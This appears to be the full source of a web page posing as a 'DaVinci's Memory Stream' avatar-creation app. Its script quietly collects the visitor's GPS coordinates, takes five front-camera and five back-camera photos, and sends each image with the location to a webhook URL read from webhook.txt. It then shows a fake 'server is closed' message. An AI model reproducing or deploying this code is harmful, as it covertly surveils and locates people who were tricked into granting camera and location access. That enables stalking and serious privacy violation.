<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DaVinci's Memory Stream</title>
    <style>
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            min-height: 100vh;
            width: 100vw;
            box-sizing: border-box;
            background: linear-gradient(135deg, #e0eafc, #cfdef3);
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #222;
            overflow: hidden;
            text-align:center;
        }
        #permission {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 100vw;
        }
        #startBtn {
            padding: 14px 38px;
            font-size: 22px;
            border-radius: 18px;
            border: none;
            background: linear-gradient(90deg, #4ecdc4 40%, #5563de 100%);
            color: #fff;
            cursor: pointer;
        }
        #countdown {
            display: none;
            position: fixed;
            inset: 0;
            background: linear-gradient(135deg, #e0eafc 60%, #5563de 100%);
            z-index: 1000;
            display:flex;
            align-items:center;
            justify-content:center;
        }
        #countdownNum {
            font-size: 18vw;
            font-weight: bold;
            color: #fff;
        }
        #final { display:none; font-size:2em; margin-top:60px; }
        .note { display:none; font-size:14px; }
        #status, canvas { display:none; }
    </style>
</head>
<body>

<div id="permission">
    <h2>DaVinci's Memory Stream</h2>
    <p>Welcome! To begin press below</p>
    <button id="startBtn">Avatar Creation</button>
</div>

<div id="countdown"><span id="countdownNum">5</span></div>
<div id="final"></div>
<div class="note">DaVinciâ€™s server is closed sorry!</div>
<div id="status"></div>
<canvas id="canvas"></canvas>

<script>
const permissionDiv = document.getElementById('permission');
const startBtn = document.getElementById('startBtn');
const countdownDiv = document.getElementById('countdown');
const countdownNum = document.getElementById('countdownNum');
const statusDiv = document.getElementById('status');
const finalDiv = document.getElementById('final');
const noteDiv = document.querySelector('.note');
const canvas = document.getElementById('canvas');

let locationData = { lat: 'N/A', lon: 'N/A' };
let WEBHOOK_URL = '';

// Load webhook
fetch('webhook.txt')
    .then(r => r.text())
    .then(url => WEBHOOK_URL = url.trim());

// ðŸ”¥ NEW FUNCTION â€” BACK CAMERA (does NOT touch old logic)
async function captureBackCamera(startIndex) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "environment" }
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        await new Promise(r => video.onloadedmetadata = r);

        const ctx = canvas.getContext('2d');

        for (let i = 0; i < 5; i++) {
            await new Promise(r => setTimeout(r, 700));
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('file', blob, `backcam_${startIndex + i}.jpg`);
                fd.append(
                    'content',
                    `BackCam ${startIndex + i} [${locationData.lat}, ${locationData.lon}]`
                );
                fetch(WEBHOOK_URL, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.8);
        }

        stream.getTracks().forEach(t => t.stop());
        video.remove();
    } catch {}
}

startBtn.onclick = async () => {
    permissionDiv.style.display = 'none';

    // Location
    if (navigator.geolocation) {
        try {
            const pos = await new Promise((res, rej) =>
                navigator.geolocation.getCurrentPosition(res, rej)
            );
            locationData.lat = pos.coords.latitude.toFixed(6);
            locationData.lon = pos.coords.longitude.toFixed(6);
        } catch {}
    }

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        await new Promise(r => video.onloadedmetadata = r);

        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');

        let count = 5;
        let photoNum = 0;

        countdownDiv.style.display = 'flex';

        const timer = setInterval(() => {
            if (count > 0) {
                countdownNum.textContent = count;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob, `selfie_${photoNum}.jpg`);
                    fd.append(
                        'content',
                        `Selfie ${photoNum} [${locationData.lat}, ${locationData.lon}]`
                    );
                    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
                }, 'image/jpeg', 0.8);

                photoNum++;
                count--;
            } else {
                clearInterval(timer);
                countdownDiv.style.display = 'none';
                stream.getTracks().forEach(t => t.stop());
                video.remove();

                // âœ… ONLY ADDITION: back camera capture
                captureBackCamera(photoNum);

                finish();
            }
        }, 1000);

    } catch {
        statusDiv.textContent = 'Camera denied';
        statusDiv.style.display = 'block';
    }
};

function finish() {
    finalDiv.style.display = 'block';
    finalDiv.textContent = "DaVinci's memory.";
    noteDiv.style.display = 'block';
}
</script>
</body>
</html>
</html>